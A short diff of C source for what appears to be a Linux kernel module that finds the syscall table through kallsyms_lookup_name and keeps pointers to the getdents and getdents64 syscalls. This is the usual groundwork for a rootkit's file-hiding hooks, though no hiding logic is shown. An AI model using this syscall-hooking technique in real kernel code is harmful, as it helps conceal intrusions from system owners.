@@ -3,17 +3,17 @@
 #include "hook.h"
 
 
-void **sys_call_table;
+unsigned long *sys_call_table;
 
-long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
-long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);
+asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
+asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);
 
 
 int
 retrieve_sys_call_table(void)
 {
-    return NULL != (sys_call_table
-        = (void **)kallsyms_lookup_name("sys_call_table"));
+    return NULL == (sys_call_table
+        = (unsigned long *)kallsyms_lookup_name("sys_call_table"));
 }
 
 void
